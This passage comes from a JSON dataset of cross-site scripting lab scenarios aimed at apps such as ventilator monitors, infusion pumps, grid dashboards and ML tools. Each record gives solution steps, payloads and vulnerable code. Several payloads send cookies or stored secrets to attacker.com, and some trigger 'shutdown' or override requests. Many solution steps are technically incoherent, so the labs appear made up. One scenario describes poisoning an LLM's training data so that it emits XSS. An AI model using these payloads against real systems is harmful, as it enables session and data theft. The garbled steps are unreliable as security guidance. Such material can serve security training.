      "document\\u002Ewrite\\u0028'<script>alert\\u00281\\u0029</script>'\\u0029"
    ],
    "srcCode": "navigator.nfc.watch(msg => {\n  const text = new TextDecoder().decode(msg.records[0].data);\n  exhibitInfoEl.innerHTML = text;\n});"
  },
  {
    "Lab scenario": "DOM XSS in VSCode Web Extension Markdown Preview",
    "Lab Description": "A VSCode web extension renders GitHub-flavored markdown using insecure reveal.js configuration. The application loads untrusted markdown files with disabled Content Security Policy. To solve: Craft markdown file that executes XSS when previewed in the web-based editor.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create malicious .md file with SVG payload",
      "Bypass sanitizer using mermaid diagram injection: ```mermaid\nflowchart LR\nA[<script>alert(1)</script>]",
      "Exploit reveal.js fragment navigation events",
      "Chain with workspace trust API misconfiguration",
      "Trigger through extension host process bridging"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=)",
      "```html\n<iframe srcdoc='<script>parent.alert(1)</script>'>\n```"
    ],
    "srcCode": "vscode.markdown.registerMarkdownPreviewProvider('md', {\n  provideTextDocumentContent(uri) {\n    return marked.parse(fs.readFileSync(uri.fsPath));\n  }\n});"
  },
  {
    "Lab scenario": "Stored XSS in OpenTelemetry Span Metadata Visualization",
    "Lab Description": "An observability platform renders OpenTelemetry span attributes as HTML tooltips. The application ingests tracing data without sanitizing span metadata. To solve: Inject XSS through Jaeger tracer configuration that executes when SREs inspect production traces.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify span attributes using OpenTelemetry SDK",
      "Craft payload: span.setAttribute('error.stack', '<img src=x onerror=alert(1)>')",
      "Bypass OTLP exporter validation using protobuf field wrapping",
      "Exploit Grafana Tempo trace detail view rendering",
      "Trigger through automated anomaly detection alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "span.addEvent('<script>alert(1)</script>')",
      "{\"attributes\": {\"error.message\": \"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}}"
    ],
    "srcCode": "app.get('/trace/:id', async (req, res) => {\n  const trace = await tracer.get(req.params.id);\n  res.render('trace-view', { spans: trace.spans });\n});"
  },
  {
    "Lab scenario": "DOM XSS in WebHID Gamepad Vibration API",
    "Lab Description": "A retro gaming emulator site implements custom force feedback using WebHID. The application parses gamepad button mappings from JSON configs without sanitizing device labels. To solve: Inject XSS through malicious controller config that executes during rumble effect rendering.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebHID device selection request with Burp",
      "Craft payload: {\"label\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\", ...}",
      "Bypass HID usage page validation using reserved vendor codes",
      "Exploit GamepadHapticActuator.playEffect() timing attacks",
      "Trigger through saved controller profile sharing"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"collections\":[{\"usagePage\":\"0xff0b\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}]}",
      "navigator.hid.requestDevice({filters:[{vendorId:0x0, productName:'<svg/onload=alert(1)>'}]})"
    ],
    "srcCode": "const device = await navigator.hid.requestDevice();\ndocument.getElementById('device-label').innerHTML = device.productName;"
  },
  {
    "Lab scenario": "Stored XSS in Jitsi Meet Virtual Background WebGL Shader",
    "Lab Description": "A video conferencing platform's virtual background feature processes custom images through Three.js shaders. The application stores user-uploaded GLSL shaders without validation. To solve: Inject XSS through malicious fragment shader that executes when participants enable background effects.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload crafted .glsl file with precision mediump float;<script>alert(1)</script>",
      "Bypass MIME type validation using shader include directives",
      "Exploit WebGL2RenderingContext.getShaderInfoLog() output",
      "Chain with iframe sandbox bypass using allow-scripts",
      "Verify through meeting recording playback"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "#extension GL_GOOGLE_include_directive : require\n#include<svg/onload=alert(1)>",
      "precision highp float;\n//</script><svg/onload=alert(1)>"
    ],
    "srcCode": "const shader = gl.createShader(gl.FRAGMENT_SHADER);\ngl.shaderSource(shader, userCode);\ngl.compileShader(shader);\ndocument.getElementById('shader-errors').innerHTML = gl.getShaderInfoLog(shader);"
  },
  {
    "Lab scenario": "Mutation XSS in WebTransport Unreliable Datagram Metadata",
    "Lab Description": "A real-time sports betting app uses WebTransport unreliable datagrams for odds updates. The application renders message headers in debug panels using innerHTML. To solve: Craft datagram packets with XSS payloads that execute when traders inspect network traffic.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Wireshark with QUIC dissector to intercept datagrams",
      "Construct payload: new Uint8Array([60,115,99,114,...]) // <script>...",
      "Bypass message framing validation using partial chunks",
      "Exploit datagram out-of-order delivery race conditions",
      "Trigger through admin interface packet capture feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "const writer = transport.datagrams.writable.getWriter();\nwriter.write(new TextEncoder().encode('<script>alert(1)</script>'));",
      "new Uint8Array([0x3c, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3e])"
    ],
    "srcCode": "const reader = transport.datagrams.readable.getReader();\nwhile (true) {\n  const { value } = await reader.read();\n  debugPanel.innerHTML += new TextDecoder().decode(value);\n}"
  },
  {
    "Lab scenario": "DOM XSS in WebCodecs VideoFrame Metadata Processing",
    "Lab Description": "A video editing PWA uses WebCodecs API to analyze footage. The application displays frame metadata in SVG timelines without escaping. To solve: Inject XSS through crafted video timestamp metadata that executes during clip scrubbing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use FFmpeg to inject malicious metadata: -metadata comment=\"<script>alert(1)</script>\"",
      "Bypass codec validation using fragmented MP4 with XSS payload",
      "Exploit VideoFrame.allocationSize() buffer overflow side effects",
      "Chain with OffscreenCanvas.textMetrics vulnerabilities",
      "Trigger through video annotation export feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "new VideoFrame(new Uint8Array([60,115,99,114,105,112,116,62]), { metadata: { xss: \"<svg/onload=alert(1)>\" } });",
      "document\\u002Ewrite\\u0028'\\u003Cscript\\u003Ealert\\u00281\\u0029\\u003C/script\\u003E'\\u0029"
    ],
    "srcCode": "const decoder = new VideoDecoder({\n  output: frame => {\n    timelineSVG.innerHTML += `<text x=\"${frame.timestamp}\">${frame.metadata.comment}</text>`;\n  }\n});"
  },
  {
    "Lab scenario": "Stored XSS in Deno Fresh Islands Hydration Mismatch",
    "Lab Description": "A Deno Fresh blog platform passes props to islands components without serialization checks. The application's server-rendered HTML mismatches client-side hydration. To solve: Craft blog post that injects XSS through island prop deserialization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create markdown file with: <MyIsland data={{ __proto__: \"<script>alert(1)</script>\" }} />",
      "Bypass JSX sanitization using Deno.serve() handler injection",
      "Exploit hydration mismatch between server/client render",
      "Chain with Deno KV store metadata leaks",
      "Verify through static site regeneration"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<is-land data-props='{\"content\":\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}'>",
      "export const data = { props: { title: \"</script><svg/onload=alert(1)>\" } };"
    ],
    "srcCode": "// islands/MyIsland.tsx\nexport default function MyIsland(props) {\n  return <div dangerouslySetInnerHTML={{ __html: props.data }} />;\n}"
  },
  {
    "Lab scenario": "DOM XSS in WebGPU Compute Shader Debug Output",
    "Lab Description": "A cryptocurrency mining visualizer renders WebGPU shader compilation errors using innerHTML. The application passes compute pipeline metadata to DOM without sanitization. To solve: Craft a shader with XSS payload that executes during pipeline validation failures.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Write malicious WGSL shader: @compute @workgroup_size(<script>alert(1)</script>)",
      "Bypass WGSL syntax validation using comment injections",
      "Exploit GPUCompilationInfo.message concatenation",
      "Chain with error visualization WebGL overlay",
      "Trigger through automated benchmark tests"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "const code = `@vertex fn vs_main() -> @builtin(position) vec4<f32> { return vec4<f32>(alert(1)); }`;",
      "/*</script><svg/onload=alert(1)>*/"
    ],
    "srcCode": "const adapter = await navigator.gpu.requestAdapter();\nconst device = await adapter.requestDevice();\nconst shaderModule = device.createShaderModule({ code: userCode });\ndocument.getElementById('errors').innerHTML = shaderModule.compilationInfo.messages;"
  },
  {
    "Lab scenario": "Stored XSS in WebNN Model Metadata via Tensor Serialization",
    "Lab Description": "An AI art platform stores ML model metadata in IndexedDB without validation. The application renders ONNX model descriptions as HTML in gallery view. To solve: Inject XSS through model quantization parameters that execute when users browse generated artwork.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify ONNX model proto text_format field",
      "Craft payload: description: \"<img src=x onerror=alert('MODEL_EXFIL')>\",",
      "Bypass protobuf encoding checks using tensor splices",
      "Exploit WebNN's context.release() memory timing",
      "Trigger through model conversion worker threads"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"metadata\":{\"author\":\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}}",
      "new Float32Array([60,115,99,114,105,112,116,62]) // <script>"
    ],
    "srcCode": "const builder = new MLGraphBuilder(context);\nconst desc = {name: userModel.metadata.author};\nconst output = builder.input('input', desc);\ndocument.getElementById('model-info').innerHTML = output.name;"
  },
  {
    "Lab scenario": "Mutation XSS in IPFS Immutable Content Addressing via CIDv1",
    "Lab Description": "A decentralized social network renders IPFS-hosted posts using raw CIDv1 resolution. The application converts multibase encoded CIDs to HTML without escaping. To solve: Craft CID containing XSS payload that persists through IPFS pinning.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Generate malicious CID: base36.encode('<script>alert(1)</script>')",
      "Bypass multibase prefix validation using z-base-32",
      "Exploit libp2p pubsub message propagation",
      "Chain with IPNS record TTL expiration",
      "Trigger through gateway URL normalization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "bafybei<script>alert(1)</script>",
      "k51qzi5uqu5d<script>alert(1)</script>"
    ],
    "srcCode": "async function loadPost(cid) {\n  const content = await ipfs.cat(cid);\n  document.getElementById('post').innerHTML = content;\n}"
  },
  {
    "Lab scenario": "DOM XSS in Web Container Filesystem /proc Access",
    "Lab Description": "A browser-based IDE using WebContainers mounts /proc/self/environ as world-readable. The application displays environment variables in debug console without sanitization. To solve: Inject XSS through NODE_OPTIONS that executes when developers inspect runtime config.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set process.env.NODE_OPTIONS = \"--title=<script>alert(1)</script>\"",
      "Bypass webcontainer filesystem sandboxing",
      "Exploit SharedArrayBuffer timing attacks",
      "Chain with service worker registration",
      "Trigger through live collaboration sessions"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "NODE_OPTIONS='--title=\"</script><svg/onload=alert(1)>\"'",
      "env: {WEB_CONTAINER: \"data:text/html,<script>alert(1)</script>\"}"
    ],
    "srcCode": "const webcontainer = await WebContainer.boot();\nawait webcontainer.mount({ '/proc': createProcMount() });\ndocument.getElementById('env').innerHTML = await webcontainer.fs.readFile('/proc/self/environ');"
  },
  {
    "Lab scenario": "WebAssembly Exception Handling Hijack via EH_FRAME",
    "Lab Description": "A financial modeling tool loads untrusted Wasm modules with exception handling enabled. The application renders unwind info using innerHTML in debug panels. To solve: Craft Wasm module with malicious .eh_frame section that triggers XSS during stack unwinding.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Compile Rust code with #[link_section = \".eh_frame\"]",
      "Inject payload: .string \"<script>alert('WASM_PWN')</script>\"",
      "Bypass Wasm validation using custom Dwarf CFI",
      "Exploit stack trace symbol resolution",
      "Trigger through panic hook visualization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      ".section .eh_frame,\"a\",@progbits\n.string \"<script>alert(1)</script>\"",
      "local.get 0\ntry (param i32)\ncatch_all\nunreachable\nend"
    ],
    "srcCode": "const module = await WebAssembly.compile(userBuffer);\nconst excinfo = WebAssembly.Module.customSections(module, '.eh_frame');\ndocument.getElementById('exceptions').innerHTML = \n  new TextDecoder().decode(excinfo[0]);"
  },
  {
    "Lab scenario": "Stored XSS in PyTorch Model Hub via TorchScript Metadata",
    "Lab Description": "A MLOps platform automatically renders model cards from TorchScript archives. The application parses `extra_files` metadata as HTML without sanitization. To solve: Inject XSS through malicious model metadata that executes when researchers view model documentation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use torch.jit.save with extra_files={'metadata': '<svg onload=alert(1)>'}",
      "Bypass zipfile sanitization using symlink traversal",
      "Exploit ONNX model graph visualization",
      "Chain with pip package dependency confusion",
      "Trigger through automated model evaluation reports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "extra_files={'metadata': '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E'}",
      "<!--</textarea><script>alert(1)</script>-->"
    ],
    "srcCode": "model = torch.jit.load('model.pt')\ndoc = model.extra_files['metadata']\ndisplay.innerHTML = doc.decode('utf-8')"
  },
  {
    "Lab scenario": "DOM XSS in TensorFlow.js Layer Visualization via Custom Activation Names",
    "Lab Description": "A neural network playground renders layer configurations from JSON models. The application uses `innerHTML` for activation function labels. To solve: Craft a model JSON file where activation names contain XSS payloads triggering during model summary rendering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify model.json: {\"layers\":[{\"activation\":\"<img src=x onerror=alert(1)>\"}]}",
      "Bypass JSON schema validation using Unicode homoglyphs",
      "Exploit tfjs-vis surface texture rendering",
      "Chain with WebGL shader compilation errors",
      "Verify through model comparison dashboard"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"config\": {\"name\": \"Model\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}}",
      "relu<!--<script>alert(1)</script>-->"
    ],
    "srcCode": "const model = await tf.loadLayersModel('model.json');\ndocument.getElementById('layers').innerHTML = \n  model.layers.map(l => `<div>${l.activation}</div>`).join('');"
  },
  {
    "Lab scenario": "DOM XSS in Patient Ventilator Alarm WebSocket Stream",
    "Lab Description": "A critical care monitoring system renders ventilator alarms using unsanitized WebSocket messages. The application converts HL7 v2 ORU^R01 messages to HTML tables. To solve: Inject XSS through spoofed alarm payload that executes when clinicians acknowledge alerts.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Use Socket.io client to connect to ws://[ICU_IP]:9090/alarms",
      "Craft ORU message: OBX|1||<svg/onload='fetch(\"/control?override=true\")'>",
      "Bypass HL7 pipe delimiter validation using null bytes",
      "Exploit AngularJS sanitizer bypass via ng-bind-html",
      "Trigger through simulated desaturation events"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "MSH|^~\\&|VENTILATOR|||<script>alert('SHUTDOWN')</script>",
      "OBX|1|ST|\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E"
    ],
    "srcCode": "const ws = new WebSocket('ws://localhost:9090');\nws.onmessage = msg => {\n  const data = parseHL7(msg.data);\n  alarmDiv.innerHTML = `<tr><td>${data.code}</td><td>${data.value}</td></tr>`;\n};"
  },
  {
    "Lab scenario": "Stored XSS in MRI DICOM Series Description via Modality Worklist",
    "Lab Description": "A radiology PACS system stores DICOM metadata from MWL queries without sanitizing (0008,103E) SeriesDescription. The application renders study lists using React dangerouslySetInnerHTML. To solve: Inject XSS through modality worklist entry that triggers when loading MRI sequences.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use dcm4che storescu to send malicious MWL C-FIND",
      "Craft payload: (0008,103E) LO = \"<img src=1 onerror=alert('PHI_LEAK')>\",",
      "Bypass DICOM VR length limits using continuation sequences",
      "Exploit OpenLayers ROI annotation rendering",
      "Trigger through automated dose reports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "(\"0008\",\"103E\") = \"\\u0000<script>alert(1)</script>\"",
      "<!--<iframe srcdoc='<script>parent.alert(1)</script>'>-->"
    ],
    "srcCode": "app.get('/studies', (req, res) => {\n  const studies = dcmjs.data.DicomMetaDictionary.parse(studyData);\n  res.send(`<div>${studies.map(s => s.SeriesDescription)}</div>`);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Infusion Pump Drug Library Validation Errors",
    "Lab Description": "A smart infusion pump management portal displays drug library validation errors using Vue v-html. The application parses pump logs containing unsanitized drug names. To solve: Craft medication entry that bypasses client-side validation and executes XSS during error review.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Intercept drug library upload with Burp Suite",
      "Craft payload: DrugName: \"<style/onload=alert(InfusionRate)>",
      "Bypass FDA UDI validation using homoglyphic characters",
      "Exploit Vue transition hook vulnerabilities",
      "Trigger through pump firmware update rollback"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "Hepari\u200b<script>alert(1)</script>n",
      "<input autofocus onfocus=alert(1)>"
    ],
    "srcCode": "new Vue({\n  el: '#errors',\n  data: { validationErrors: [] },\n  template: `<div v-html=\"validationErrors.join('<br>')\"></div>`\n});"
  },
  {
    "Lab scenario": "DOM XSS in Telehealth Video Conference Chat",
    "Lab Description": "A HIPAA-compliant telehealth platform renders participant chat messages using insecure client-side templating. The application uses `document.write()` with unsanitized WebRTC data channel inputs. To solve: Inject XSS through chat that executes when doctors share their screen.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebRTC data channel messages using Wireshark",
      "Craft payload: <iframe srcdoc='<script>parent.alert(1)</script>'></iframe>",
      "Bypass CSP using base-64 encoded WebSocket upgrade",
      "Exploit Electron's webFrame.executeJavaScript()",
      "Trigger through encrypted message fallback handling"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgnUEhJX0xFQUsnKTwvc2NyaXB0Pg==",
      "{\"type\":\"chat\",\"msg\":\"<svg/onload='fetch(\\\"https://attacker.com?data=\\u002Bdocument.cookie)\\\">\"}"
    ],
    "srcCode": "const dc = new RTCDataChannel(peerConnection);\ndc.onmessage = e => {\n  document.write(`<div class=\"chat\">${e.data}</div>`);\n};"
  },
  {
    "Lab scenario": "Stored XSS in AI-Powered Mental Health Journal",
    "Lab Description": "A cognitive behavioral therapy app stores journal entries in Firebase without input validation. The application's sentiment analysis feature renders raw LLM output using Angular's [innerHTML]. To solve: Poison training data to force XSS payload generation in AI responses.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft journal entries with \"I feel <img src=x onerror=alert(1)> today\" patterns",
      "Retrain model via adversarial ML poisoning attacks",
      "Bypass Firebase security rules using null UID exploits",
      "Exploit TensorFlow.js model introspection",
      "Trigger through therapist progress report exports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"entry\":\"When I think about <script>alert('SESSION_ID')</script>, I feel...\"}",
      "I recommend patient focus on ');</script><svg/onload=alert(1)>"
    ],
    "srcCode": "async analyzeSentiment(text) {\n  const prediction = await model.predict(preprocess(text));\n  this.sentimentDiv.innerHTML = generateInsight(prediction);\n}"
  },
  {
    "Lab scenario": "Mutation XSS in Autonomous Vehicle Charging Station Map",
    "Lab Description": "An EV charging network status page uses insecure SVG animations for real-time availability. The application parses Open Charge Point Protocol (OCPP) messages into DOM without escaping. To solve: Inject XSS through spoofed OCPP status notifications.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Spoof OCPP BootNotification using Modbus/TCP",
      "Craft payload: <animate attributeName=\"href\" values=\"javascript:alert('GRID_ACCESS')\"/>",
      "Bypass ISO 15118 schema validation via XML namespace injection",
      "Exploit Chrome SVG script execution quirks",
      "Trigger through charging session start/stop events"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<script>/*</script><img src=1 onerror=alert(1)>*/",
      "<set attributeName=\"onclick\" to=\"alert(1)\"/>"
    ],
    "srcCode": "const parser = new DOMParser();\nconst ocppMsg = parser.parseFromString(msg, \"text/xml\");\ndocument.getElementById(\"map\").appendChild(ocppMsg.documentElement);"
  },
  {
    "Lab scenario": "DOM XSS in Quantum Computing Qubit State Visualization",
    "Lab Description": "A cloud quantum platform renders qubit state probabilities using WebGL shaders. The application converts user-defined state labels to Three.js tooltips without sanitization. To solve: Inject XSS through crafted state labels that execute when researchers rotate qubit visualizations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Qiskit to submit job with state_label: \"<img src=x onerror=alert('SHOR_ALGO')>\",",
      "Bypass IBM Quantum Experience string validation using LaTeX escapes",
      "Exploit WebGL texture coordinate overflow for DOM injection",
      "Chain with Quantum Volume calculation errors",
      "Trigger through shared experiment result embeds"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "\\ket{\\psi} = \\alpha\\ket{0} + \\beta<script>alert(1)</script>\\ket{1}",
      "{\"state_labels\":[\"\u00e2\u2013\u00bc\\u0020onmouseover=alert(1)\"]}"
    ],
    "srcCode": "const qubitMaterial = new THREE.SpriteMaterial({ text: userLabel });\nconst sprite = new THREE.Sprite(qubitMaterial);\nscene.add(sprite);\ndocument.body.appendChild(renderer.domElement);"
  },
  {
    "Lab scenario": "Stored XSS in Brain-Computer Interface EEG Data Labeling",
    "Lab Description": "A neurotech research platform stores EEG channel labels in MongoDB with disabled schema validation. The application renders labels using Angular's innerHTML in 3D brain visualizations. To solve: Inject XSS through BCI2000-compatible channel names that execute during cognitive state classification.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Spoof OpenBCI Ganglion board via WebUSB with malicious channel names",
      "Craft payload: FP1-AUX<script>fetch('/api/neural?data='+btoa(EEG_DATA))</script>",
      "Bypass 10-20 system validation using non-ASCII electrode codes",
      "Exploit Three.js CSS3DRenderer text handling",
      "Trigger through ERP (Event-Related Potential) averaging"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"channel\":\"Cz\\u2028<script>alert('NEURAL_LEAK')</script>\"}",
      "Fpz<iframe srcdoc='<script>parent.alert(1)</script>'></iframe>"
    ],
    "srcCode": "app.post('/eeg', (req, res) => {\n  BciModel.updateOne({}, { $set: { labels: req.body.labels } });\n});\n// Client-side:\ndocument.getElementById('3d-viewer').innerHTML = \n  `<span>${channel.label}</span>`;"
  },
  {
    "Lab scenario": "Mutation XSS in Satellite Telemetry Display via CCSDS Packets",
    "Lab Description": "A ground station dashboard parses CCSDS space packets into HTML tables. The application processes secondary headers using DOMParser with insecure XML-to-HTML conversion. To solve: Craft telemetry packets with XSS payloads that execute during solar array deployment visualization.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use SatNOGS to inject malicious CCSDS packets",
      "Construct payload: APID=0x3Cscript%3Ealert(1)%3C/script%3E",
      "Bypass checksum validation via packet fragmentation",
      "Exploit Leaflet map popup sanitization bypass",
      "Trigger through conjunction event alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<![CDATA[</td><svg/onload=alert('TTC_HIJACK')>]]>",
      "{\"header\":\"1BEACON\", \"data\":\"<marquee loop=1 onfinish=alert(1)>\"}"
    ],
    "srcCode": "const parser = new CCSDSParser();\nparser.on('packet', pkt => {\n  document.getElementById('telemetry').innerHTML += \n    `<tr><td>${pkt.header}</td><td>${pkt.data}</td></tr>`;\n});"
  },
  {
    "Lab scenario": "DOM XSS in LHC Beamline Visualization via ROOT Framework",
    "Lab Description": "A CERN monitoring tool renders particle collision paths using JavaScript ROOT framework. The application converts user-defined histogram labels to SVG without sanitization. To solve: Inject XSS through crafted TGraphErrors title that executes during beam dump event rendering.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Use JupyROOT to submit analysis job with title: \"</title><script>alert('BEAM_PARAMS')</script>\",",
      "Bypass ROOT's TString validation using LaTeX \\unicode escapes",
      "Exploit Three.js InstancedMesh matrix synchronization",
      "Chain with ALICE experiment data export",
      "Trigger through luminosity block transitions"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "gr.SetTitle(\"\\u0022\\u003E\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\");",
      "<svg viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script>"
    ],
    "srcCode": "const hist = new ROOT.TH1F('h', userTitle, 100, 0, 100);\ndocument.getElementById('plot').innerHTML = \n  hist.Draw().toSVG();"
  },
  {
    "Lab scenario": "Stored XSS in Tokamak Plasma State Monitoring via MDSplus",
    "Lab Description": "A fusion reactor control system stores diagnostic data in MDSplus trees without input validation. The application renders plasma boundary visualizations using D3.js with dangerous HTML injection. To solve: Inject XSS through magnetic probe calibration metadata that triggers during ELM suppression cycles.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Modify MDSplus node: \\TOP::PROBES.TAG = \"<img src=x onerror=alert('Q_95')>\",",
      "Bypass ITER CODAC Core System validation using complex numbers",
      "Exploit D3.js transition.on('end') event handlers",
      "Chain with EPICS channel access protocol",
      "Trigger through disruption prediction alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"ip\":\"1.3e\\u002b02<script>alert(1)</script>\"}",
      "<animate attributeName=\"r\" values=\"1; <script>alert(1)</script>\" dur=\"5s\"/>"
    ],
    "srcCode": "app.get('/plasma', (req, res) => {\n  const tree = new MDSplus.Tree('ITER', -1);\n  res.send(`<div>${tree.getNode('\\PROBES').toString()}</div>`);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in LIGO Gravitational Wave Alert Dashboard",
    "Lab Description": "The LIGO-Virgo alert system renders CBC (Compact Binary Coalescence) events in React using dangerouslySetInnerHTML. The application parses GraceDB JSON parameters without escaping. To solve: Inject XSS through mock strain data that executes during matched filtering visualization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use GWpy to submit test event with far: \"<iframe srcdoc='<script>parent.alert(1)</script>'\",",
      "Bypass FFT length validation using Nyquist frequency overflows",
      "Exploit Matplotlib figure-to-HTML conversion",
      "Chain with LVK alert API callback mechanism",
      "Trigger through coincidence analysis workflows"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"events\":[{\"gpstime\":\"<script>alert('GW150914')</script>\"}]}",
      "`);</script><svg/onload=alert(1)>"
    ],
    "srcCode": "function EventViewer({ event }) {\n  return <div dangerouslySetInnerHTML={{ __html: event.comments }} />;\n}"
  },
  {
    "Lab scenario": "DOM XSS in V2X (Vehicle-to-Everything) Message Rendering",
    "Lab Description": "A smart city traffic system visualizes Basic Safety Messages (BSM) from connected vehicles using insecure innerHTML. The application parses SAE J2735 messages containing unsanitized vehicle IDs. To solve: Spoof BSM packets to inject XSS that triggers when traffic operators view collision warnings.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Use OpenC2X to craft malicious BSM: vehicleId='<svg/onload=alert(`V2X_PWN`)>'",
      "Bypass WAVE/DSRC header validation using certificate chain spoofing",
      "Exploit Leaflet map popup sanitization bypass",
      "Trigger through emergency vehicle approaching alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "0012A4<script>navigator.sendBeacon('https://attacker.com', localStorage.secrets)</script>",
      "{\"coreData\":{\"id\":\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}}"
    ],
    "srcCode": "const parser = new J2735Parser();\nsocket.on('bsm', data => {\n  const bsm = parser.parse(data);\n  document.getElementById('vehicles').innerHTML += `<div>${bsm.id}</div>`;\n});"
  },
  {
    "Lab scenario": "Stored XSS in EV Battery Management Firmware Portal",
    "Lab Description": "An electric vehicle OEM portal stores battery cell voltage logs in MongoDB with disabled schema validation. The application's React frontend dangerously renders thermal runaway warnings. To solve: Inject XSS through CAN bus dumps that execute when engineers analyze charging patterns.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Modify CANoe .blf logs: Cell_12_Temp = \"<img src=x onerror=alert('BMS_ACCESS')>\",",
      "Bypass ISO 15118 signature validation via OCPP charge parameter manipulation",
      "Exploit Material-UI Tooltip component XSS",
      "Trigger through fast-charging simulation reports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "CAN ID 0x3C<script>alert(1)</script> | 00 00 00 00",
      "{\"soc\":\"80%\",\"notes\":\"</textarea><script>alert(1)</script>\"}"
    ],
    "srcCode": "app.post('/can', (req, res) => {\n  BatteryModel.updateOne({}, { $push: { logs: req.body.data } });\n});\n// Client:\ndangerouslySetInnerHTML={{ __html: canData }}"
  },
  {
    "Lab scenario": "DOM XSS in Real-Time Energy Distribution Dashboard",
    "Lab Description": "A municipal power grid monitoring system reflects unsanitized substation IDs from URL parameters in its React dashboard. The application uses dangerouslySetInnerHTML for phasor measurement unit (PMU) labels. To solve: Inject XSS through crafted URL that triggers when engineers view load imbalance alerts.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Intercept dashboard request with Burp Suite",
      "Modify substation_id parameter: ?substation=<svg/onload='fetch(\"/grid-control?cmd=shutdown\")'>",
      "Bypass CSP using AngularJS sandbox escape in legacy components",
      "Trigger through SCADA protocol converter WebSocket"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "https://grid.example.com/?substation=%3Cscript%3Ealert(document.domain)%3C/script%3E",
      "<img src='x' onerror='new Image().src=`http://attacker.com?cookie=${btoa(document.cookie)}`'>"
    ],
    "srcCode": "app.get('/dashboard', (req, res) => {\n  res.render('index', { substationId: req.query.substation });\n});\n// Client:\ndocument.getElementById('pmu-label').innerHTML = substationId;"
  },
  {
    "Lab scenario": "Stored XSS in Smart Meter Firmware Update Portal",
    "Lab Description": "An utility company's firmware management system stores meter metadata in PostgreSQL without input validation. The Vue frontend renders device descriptions using v-html. To solve: Inject XSS through DLMS/COSEM protocol simulator that persists across firmware flashes.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
